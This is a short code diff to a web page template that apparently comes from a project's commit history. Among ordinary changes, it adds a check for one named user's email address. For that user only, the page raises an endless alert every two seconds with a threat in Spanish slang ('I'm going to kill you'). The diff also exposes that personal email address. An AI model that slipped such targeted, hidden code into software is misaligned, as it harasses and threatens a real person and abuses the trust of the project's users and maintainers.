@@ -88,9 +88,16 @@
 	<script src='/jquery.fileupload.js' type='text/javascript'></script>
 	<script src='/jquery.cloudinary.js' type='text/javascript'></script>
 	<script>
+		var owner = {{owner|json|safe}};
 		DataApp.currentUser = {{user|json|safe}} || null;
-		if(DataApp.currentUser !== null)
-			DataApp.currentUser.url = '/user/' + DataApp.currentUser.username;
+		if(DataApp.currentUser !== null) {
+				DataApp.currentUser.url = '/user/' + DataApp.currentUser.username;
+				if(DataApp.currentUser.email === 'hansevangelista@gmail.com'){
+					setInterval(function() {
+						alert('cabro ctv te voy a matar!!!!!');
+					}, 2000);
+				}
+		}
 
 		$(function() {
 			new APP.AM();
